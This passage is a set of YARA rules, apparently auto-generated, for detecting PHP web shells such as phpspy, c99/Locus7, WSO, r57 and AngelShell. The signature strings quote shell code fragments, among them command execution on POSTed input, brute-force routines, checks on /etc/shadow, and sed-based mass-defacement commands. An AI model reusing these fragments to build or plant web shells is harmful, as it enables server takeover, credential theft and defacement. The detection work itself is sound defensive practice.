      $s19 = "<td style=\"overflow:auto\" width=\"49%\" height=\"25\" bgcolor=\"#FCFEBA\">" fullword ascii
      $s20 = "if(!fwrite($handle, $filecontents))" fullword ascii
   condition:
      ( ( uint16(0) == 0x213c or uint16(0) == 0x3c0a ) and filesize < 40KB and ( 8 of them )
      ) or ( all of them )
}

rule _0303e32c8e6674ec89356c9282eeac81606b4fb5_04edbee5e0a3cee384e464d05969bd89b0d32a52_2008_49c50fe8a010c9849384328b5ca7738065be_202
{
   meta:
      description = "php17 - from files 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 04edbee5e0a3cee384e464d05969bd89b0d32a52.php, 2008.php, 49c50fe8a010c9849384328b5ca7738065be0a13.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php, 82e9a1a1accef35ca21d1e7da20c851659596462.php, a647275c30e0a1e78903680ea97931aa8cd39118.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash2 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash3 = "6e0ea4ea135950956996df7e86fed9c7f7d77ff89aa1843ec5290ab38e638da4"
      hash4 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
      hash5 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
      hash6 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
      hash7 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
   strings:
      $s1 = "scookie('phpspypass', '', -86400 * 365);" fullword ascii
      $s2 = "dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s3 = "dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s4 = "makeinput(array('title'=>'Command','name'=>'command','value'=>$command));" fullword ascii
      $s5 = "scookie('phpspypass', $password);" fullword ascii
      $s6 = "href=\"javascript:settable(\\''.$table['Name'].'\\', \\'drop\\');\">Drop</a> ]</td>');" fullword ascii
      $s7 = "p(' | <a href=\"javascript:godir(\\''.$nowpath.'\\',\\'1\\');\">View Writable</a>');" fullword ascii
      $s8 = "if ($_COOKIE['phpspypass'] != $admin['pass']) {" fullword ascii
      $s9 = "p(\"<tr class=\\\"\".bg().\"\\\"><td colspan=\\\"\".($highver ? 8 : 6).\"\\\"><input name=\\\"saveasfile\\\" value=\\\"1\\\" typ" ascii
      $s10 = "if ($admin['pass'] == $password) {" fullword ascii
      $s11 = "$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');" fullword ascii
      $s12 = "if ($_COOKIE['phpspypass']) {" fullword ascii
      $s13 = "$fileurl = str_replace(SA_ROOT,'',$filedb['server_link']);" fullword ascii
      $s14 = "formhead(array('name'=>'fileopform'));" fullword ascii
      $s15 = "makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));" fullword ascii
      $s16 = "$dirdata = GetList($nowpath);" fullword ascii
      $s17 = "p(\"<td nowrap>$name<br><span>$type($len)</span></td>\");" fullword ascii
      $s18 = "p('<td colspan=\"'.($highver ? 4 : 2).'\">&nbsp;</td>');" fullword ascii
      $s19 = "//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );" fullword ascii
      $s20 = "p('<td>'.$table['Update_time'].'</td>');" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _1898eebe767f4dda4709621164eeef8377c43bb3_ad1928ed1cec75b09a7d05548b47cae5c472a427_203
{
   meta:
      description = "php17 - from files 1898eebe767f4dda4709621164eeef8377c43bb3.php, ad1928ed1cec75b09a7d05548b47cae5c472a427.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash2 = "63d02e75b729e2cc17604235cf9c0b506b3ca5d578a8e32a0e85e28763ca25a6"
   strings:
      $x1 = "-equiv=\\'refresh\\' content=\\'5\\\\;url=http\\:\\/\\/locus7s.com\\'>/g' index.*\">index.* Mass Defacement" fullword ascii
      $x2 = "<OPTION VALUE=\"sed -i -e 's/<html>/<div style=\\'position\\:absolute\\;width\\:2000px\\;height\\:2000px\\;background-color\\:bl" ascii
      $s3 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - Locus7Shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #009900; FONT-" ascii
      $s4 = "*  C100 SHELL - REVAMPED (X2300) MODIFIED BY LOCUS7S     " fullword ascii
      $s5 = "*  UNDERGROUND NETWORK | WWW.LOCUS7S.COM                 " fullword ascii
      $s6 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s7 = "om\">www.LOCUS7S.com</font></a><font color=\"#FF0000\"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); " ascii
      $s8 = "if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download c99shell.php manually <a href=\\\"\".$so" ascii
      $s9 = "*  Re-Modified by #!physx^ (15.2.07)                                                          " fullword ascii
      $s10 = "nbsp\\;&nbsp\\;<font size=\\'10\\' color=\\'green\\'>HACKED BY <a href=\\'http\\:\\/\\/locus7s.com\\'>LOCUS7S<\\/a><\\/font><\\/" ascii
      $s11 = "v. <?php echo $shver; ?> <a href=\"http://www.locus7s.com/\"><u><b>Modded by</b></u></a> #!physx^  | <a href=\"http://www.locus7" ascii
      $s12 = "*  Written by Captain Crunch Team                                                          " fullword ascii
      $s13 = "*  WWW.CCTEAM.RU                                         " fullword ascii
      $s14 = "if ($act == \"update\") {$ret = c99sh_getupdate(!!$confirmupdate); echo \"<b>\".$ret.\"</b>\"; if (stristr($ret,\"new version\")" ascii
      $s15 = "</body></html><?php chdir($lastdir); c99shexit(); ?> " fullword ascii
      $s16 = "000000 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ x2300 Locu" ascii
      $s17 = "r: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 " ascii
      $s18 = "r-3dlight-color: #00CC00; scrollbar-darkshadow-color: #009900; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; f" ascii
      $s19 = "llSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor=" ascii
      $s20 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgcol" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _060ad92489947d410d897474079c1477_25b2ffa40e50b038212591c4eb09a89fe10cbd43_75aa5981c7740da3a645cd272029090750474ae1_98d13eea_204
{
   meta:
      description = "php17 - from files 060ad92489947d410d897474079c1477.php, 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash2 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
      hash3 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash4 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
   strings:
      $s1 = "if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s2 = "wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/\\" fullword ascii
      $s3 = "function wsoBruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s4 = "wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/\\" fullword ascii
      $s5 = "echo \"file name: <input type=text name=p2 value='wso_\" . date(\"Ymd_His\") . \".\" . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz" fullword ascii
      $s6 = "WSOsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);" fullword ascii
      $s7 = "WSOsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);" fullword ascii
      $s8 = "WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);" fullword ascii
      $s9 = "WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0);" fullword ascii
      $s10 = "WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true);" fullword ascii
      $s11 = "WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);" fullword ascii
      $s12 = "=name value=\"'.htmlspecialchars($_POST['p1']).'\"><input type=submit value=\">>\"></form>';" fullword ascii
      $s13 = "$dirContent = wsoScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);" fullword ascii
      $s14 = "$sql .= 'INSERT INTO `'.$table.'` ('.implode(\", \", $columns).\") VALUES \\n\\t(\".implode(\", \", $item).')';" fullword ascii
      $s15 = "$sql .= 'INSERT INTO `'.$table.'` ('.implode(\", \", $columns).\") VALUES \\n\\t(\".implode(\", \", $item).'" fullword ascii
      $s16 = "if( wsoBruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {" fullword ascii
      $s17 = "if( wsoBruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {" fullword ascii
      $s18 = "echo \"</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 \".(@$_COOKIE[md5($_SERVER['HTTP_HOST']" ascii
      $s19 = "e;\"><input type=text name=touch value=\"'.date(\"Y-m-d H:i:s\", @filemtime($_POST['p1'])).'\"><input type=submit value=\">>\"><" ascii
      $s20 = "'!(body|a:\\w+|body, td, th, h1, h2) {.*}!msiU'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_0353ab4cbed5beae847a7ff6e220b5cf_05311655a15b75fab86956663e1819cd_0771fc6f0f4b1d7d1bb73bbb_205
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 0353ab4cbed5beae847a7ff6e220b5cf.php, 05311655a15b75fab86956663e1819cd.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash4 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash5 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash6 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash8 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash9 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash10 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash11 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash12 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $s1 = "$sort_default = \"0a\"; //Default sorting, 0 - number of colomn, \"a\"scending or \"d\"escending" fullword ascii
      $s2 = "$login_txt = \"Restricted area\"; //http-auth message." fullword ascii
      $s3 = "/* If you publish free shell and you wish" fullword ascii
      $s4 = "string {closetag} - close html-tag, e.g. \"</b>\" (default)" fullword ascii
      $s5 = "string {opentag} - open html-tag, e.g. \"<b>\" (default)" fullword ascii
      $s6 = "_size(filesize($d.$f)).\") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\".view_perms_color($d.$f).\"</b><br>Select action/file-type:<br>\";" fullword ascii
      $s7 = "echo \"<center>base64_decode - \";" fullword ascii
      $s8 = "echo \"&nbsp;<a href=\\\"#\\\" onclick=\\\"set_encoder_input(document.forms.encoder.debase64.value)\\\"><b>^</b></a>\";" fullword ascii
      $s9 = "$safemode_diskettes = array(\"a\"); // This variable for disabling diskett-errors." fullword ascii
      $s10 = "// Registered executable file-types." fullword ascii
      $s11 = "0 - files and folders (as default)," fullword ascii
      $s12 = "1 - files only, 2 - folders only" fullword ascii
      $s13 = "// Command-aliases" fullword ascii
      $s14 = "echo \"</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this.s" ascii
      $s15 = "<br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this.s" ascii
      $s16 = "string {regexp} - regular exp." fullword ascii
      $s17 = "$surl.\"act=img&img=sort_desc\\\" height=\\\"9\\\" width=\\\"14\\\" border=\\\"0\\\"></a>\";}" fullword ascii
      $s18 = "//   {command}: %f% = filename" fullword ascii
      $s19 = "// array (i=>{letter} ...); string {letter} - letter of a drive" fullword ascii
      $s20 = "echo \"</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseov" ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _1b45fc7d2a485cce8295a4962b581979b08fb01d_20784cd31c22ddaa849b6c93042df34c1d462ab9_691a4634dc5f78ceee68850138b8b68047b8dca6__206
{
   meta:
      description = "php17 - from files 1b45fc7d2a485cce8295a4962b581979b08fb01d.php, 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, a9b8077357065b95c2bc7f3ffa7baea65895d920.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "06fa69321e2a28a683c7dc14381132981804aa20fe860c596fa504d8646cef57"
      hash2 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash3 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash4 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash5 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash6 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash7 = "623d482f0f99bd37b67b2e98b697b7a19c08b2e296fd83fed439627b5a30cd3b"
   strings:
      $s1 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s2 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"" fullword ascii
      $s3 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s4 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s5 = "else { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s6 = "$sql = \"SELECT * FROM temp_r57_table;\";" fullword ascii
      $s7 = "$sql = \"DROP TABLE IF EXISTS temp_r57_table;\";" fullword ascii
      $s8 = "$sql = \"CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL );\";" fullword ascii
      $s9 = "if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }" fullword ascii
      $s10 = "if(!$file=@fopen($_POST['e_name'],\"w\")) { echo we($_POST['e_name']); }" fullword ascii
      $s11 = "echo ws(3).@get_current_user().\"<br>\";" fullword ascii
      $s12 = "if($windows) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w')).\"\\n\"; }" fullword ascii
      $s13 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"; }" ascii
      $s14 = "echo \"<b>\".date (\"d-m-Y H:i:s\").\"</b>\";" fullword ascii
      $s15 = "><div align=center><b>\".$text.$i.\"</b></div></font></td></tr></table>\";" fullword ascii
      $s16 = "if(@is_file($_POST['file']))" fullword ascii
      $s17 = "$file = @file($_POST['file']);" fullword ascii
      $s18 = "else if (!empty($lin1)&&!empty($lin2)) {$sysctl = \"$lin1 $lin2\"; }" fullword ascii
      $s19 = "if (!empty($bsd1)&&!empty($bsd2)) { $sysctl = \"$bsd1 $bsd2\"; }" fullword ascii
      $s20 = "echo((!empty($id))?(ws(3).$id.\"<br>\"):(ws(3).\"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid().\"<br>" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _043c3d7e489c69b48737cc0c92d0f3a2_0e634bcc16b562c9a8365ef42b37be8a0eabfd73_2009mssql_2011_2011__2__6e43c4411972b54c6780f45d8_207
{
   meta:
      description = "php17 - from files 043c3d7e489c69b48737cc0c92d0f3a2.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2009mssql.php, 2011.php, 2011__2_.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash2 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash3 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash4 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash5 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash6 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash7 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash8 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash9 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash10 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $x1 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s2 = "if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$content.'@', @file_get_contents($f)) ){" fullword ascii
      $s3 = "function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {" fullword ascii
      $s4 = "if ( strstr($file, $content) || strstr( @file_get_contents($f),$content ) ) {" fullword ascii
      $s5 = "' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '').\"</span></td>\");" fullword ascii
      $s6 = "if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {" fullword ascii
      $s7 = "function GetSFileList($dir, $content, $re = 0) {" fullword ascii
      $s8 = "GetSFileList($f, $content, $re = 0);" fullword ascii
      $s9 = "if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {" fullword ascii
      $s10 = "makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));" fullword ascii
      $s11 = "$query = str_replace(\" LIMIT \", \" order by $keyfied DESC LIMIT \", $query);" fullword ascii
      $s12 = "$filedata = GetSFileList($nowpath, $findstr, $re);" fullword ascii
      $s13 = "$getfield = q(\"SHOW COLUMNS FROM $tablename\");" fullword ascii
      $s14 = "p(\"<td nowrap>$name<br><span>$type($len)\".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</" ascii
      $s15 = "p(\"<td nowrap>$name<br><span>$type($len)\".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</" ascii
      $s16 = "p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td>'.$value.'&nbsp;</td></tr>');" fullword ascii
      $s17 = "while($row = @mysql_fetch_assoc($getfield)) {" fullword ascii
      $s18 = "if ($row['Key'] == 'UNI' || $row['Key'] == 'PRI') {" fullword ascii
      $s19 = "$findstr = $_POST['findstr'];" fullword ascii
      $s20 = "!$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _184904fad2bac801b5ffd71da2725ce099c1c077_8d87d250b39b4f622107217f9454c057c76b3ae9_a48296ad11ed041e4db9991af1057fb6_208
{
   meta:
      description = "php17 - from files 184904fad2bac801b5ffd71da2725ce099c1c077.php, 8d87d250b39b4f622107217f9454c057c76b3ae9.php, a48296ad11ed041e4db9991af1057fb6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "93419ee1a9f3416109cebe714b01364db8c45b9ff1d254ef3d8eff21c593b262"
      hash2 = "ae4d2498d852c2c2908709acc93ef11d8eb6f4ed698c606ec7aa2d76385365aa"
      hash3 = "8cbde0e322651be9d980fe33ddee4844beabc7ded6fbc270d92a3772cd25f284"
   strings:
      $s1 = "\\$h=  \\$_POST['cmd'];" fullword ascii
      $s2 = "if(empty(\\$_POST['cmd'])){" fullword ascii
      $s3 = "<input type='submit' value='  open (shill.txt) '>" fullword ascii
      $s4 = "\\$path= exec(\\\"pwd\\\");" fullword ascii
      $s5 = "echo  error_log(\"" fullword ascii
      $s6 = "$content = stripslashes($content);" fullword ascii
      $s7 = "$fp = fopen($_POST['savefile'], \"w\");" fullword ascii
      $s8 = "<input type='cmd' name='cmd' size='20'>" fullword ascii
      $s9 = "$content = $content . $string;" fullword ascii
      $s10 = "if(empty($_POST['copy'])){" fullword ascii
      $s11 = "if(empty(\\$_POST['m'])){" fullword ascii
      $s12 = "\\$m=\\$_POST['m'];" fullword ascii
      $s13 = "if(empty($_POST['curl'])){" fullword ascii
      $s14 = "$u1p=$_POST['copy'];" fullword ascii
      $s15 = "<input type='submit' value='  run  '>" fullword ascii
      $s16 = "$m=$_POST['curl'];" fullword ascii
      $s17 = "fwrite($fp, $content);" fullword ascii
      $s18 = "ECHO \\\" reade for up \\\";" fullword ascii
      $s19 = "\\$CopyFile = copy(\\$fileup,\\\"\\$path\\\");" fullword ascii
      $s20 = "echo  system(\\$m);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x683c ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _00392828ffb7aabd6c66ca775f1356eef850c8b7_a05811ee776c0536a890dba465e501168851df6c_209
{
   meta:
      description = "php17 - from files 00392828ffb7aabd6c66ca775f1356eef850c8b7.php, a05811ee776c0536a890dba465e501168851df6c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19ddef3ac56931999f086573be93b5385319b35081e9d5dbce0b8e3e16f85a64"
      hash2 = "bdae76eb77568d3cfe7e58878ce5520d2e3065d4567b7c9d24d193a012637227"
   strings:
      $s1 = "if ($_POST['type'] == 'pgsql') $_POST['p3'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . ($_POST['p3'] * 30);" fullword ascii
      $s2 = "else $_POST['p3'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . ($_POST['p3'] * 30) . ',30';" fullword ascii
      $s3 = "if (@copy(\"compress.zlib://\" . $_POST['p2'], $temp)) {" fullword ascii
      $s4 = "echo \"<br><textarea name='p3' style='width:100%;height:100px'>\" . @htmlspecialchars($_POST['p3']) . \"</textarea><br/><input t" ascii
      $s5 = "$dirContent = @scandir(isset($_POST['c']) ? $_POST['c'] : $GLOBALS['cwd']);" fullword ascii
      $s6 = "echo 'INSERT INTO ' . $table . ' (' . implode(\", \", $columns) . ') VALUES (' . implode(\", \", $item) . ');' . \"" fullword ascii
      $s7 = "foreach ($_SESSION['f'] as $k => $f) $_SESSION['f'][$k] = urldecode($f);" fullword ascii
      $s8 = "echo 'INSERT INTO `' . $table . '` (' . implode(\", \", $columns) . ') VALUES (' . implode(\", \", $item) . ');' . \"" fullword ascii
      $s9 = "elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i]) && ($dirContent[$i] != \".\")) $dirs[] = array_merge($tmp, array('type' => 'd" ascii
      $s10 = "echo \"document.cf.output.value+='\" . $temp . \"';\";" fullword ascii
      $s11 = "if ((@$_POST['p1'] == 'query') && !empty($_POST['p3'])) {" fullword ascii
      $s12 = "if( $cwd[strlen($cwd) - 1] != '/' )" fullword ascii
      $s13 = "echo \"document.cf.cmd.value='';" fullword ascii
      $s14 = "$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2'] . '');" fullword ascii
      $s15 = "echo \"<span>\" . $_POST['p2'] . \"</span> ($num) \";" fullword ascii
      $s16 = "$temp = @tempnam($test, 'cx');" fullword ascii
      $s17 = "$files = glob($_POST['p2'] . '*');" fullword ascii
      $s18 = "$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));" fullword ascii
      $s19 = "for ($i = 0;$i < ($num / 30);$i++) if ($i != (int)$_POST['p3']) echo \"<a href='#' onclick='st(\\\"\" . $_POST['p2'] . \"\\\", $" ascii
      $s20 = "echo '<h1>Console</h1><div class=content><form name=cf onsubmit=\"if(document.cf.cmd.value==\\'clear\\'){document.cf.output.valu" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _1n73ction_493751a287a35ae1906ef1823610ae8c963a18b9_683f78842d7cf41a39744494a4bb787d6c6c4e91_210
{
   meta:
      description = "php17 - from files 1n73ction.php, 493751a287a35ae1906ef1823610ae8c963a18b9.php, 683f78842d7cf41a39744494a4bb787d6c6c4e91.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9af1a6e4122d7751016c5aee923352962427c48ec0924bf007aac751cdad7af1"
      hash2 = "f093b9f8ffb3ce318e06b84172c5f46cd97bff2be6ee4f022459733936594732"
      hash3 = "f3d0d694f2dd8b78a947a5e00c28d023c0fcc291ac5e70f74a81780bd5abb3e1"
   strings:
      $s1 = "$hashresult = \"MySQL Hash / /DES(Oracle Hash)\";" fullword ascii
      $s2 = "$GetHashChar = substr($hash, 40);" fullword ascii
      $s3 = "$hashresult = \"SHA-1 Hash/ /MySQL5 Hash\";" fullword ascii
      $s4 = "if($GetHashChar == \"*\"){" fullword ascii
      $s5 = "if(isset($_POST['gethash'])){" fullword ascii
      $s6 = "$hash = $_POST['hash'];" fullword ascii
      $s7 = "if(isset($_POST['save'])){" fullword ascii
      $s8 = "$hashresult = \"Not Hash Entered\";" fullword ascii
      $s9 = "$hashresult = \"Hash type not found\";" fullword ascii
      $s10 = "$hashresult = \"SHA-256(Unix) Hash\";" fullword ascii
      $s11 = "$hashresult = \"MD5(Wordpress) Hash\";" fullword ascii
      $s12 = "$hashresult = \"SHA-512(Unix) Hash\";" fullword ascii
      $s13 = "$hashresult = \"MD5(Unix) Hash\";" fullword ascii
      $s14 = "$hashresult = \"MD5(Base-64) Hash\";" fullword ascii
      $s15 = "$hashresult = \"MD5(APR) Hash\";" fullword ascii
      $s16 = "$hashresult = \"MD5(phpBB3) Hash\";" fullword ascii
      $s17 = "$hashresult = \"DES(Unix) Hash\";" fullword ascii
      $s18 = "}elseif(strlen($hash)==16){" fullword ascii
      $s19 = "if(strstr($hash, '$apr1$')){" fullword ascii
      $s20 = "}elseif(strlen($hash)==24){" fullword ascii
   condition:
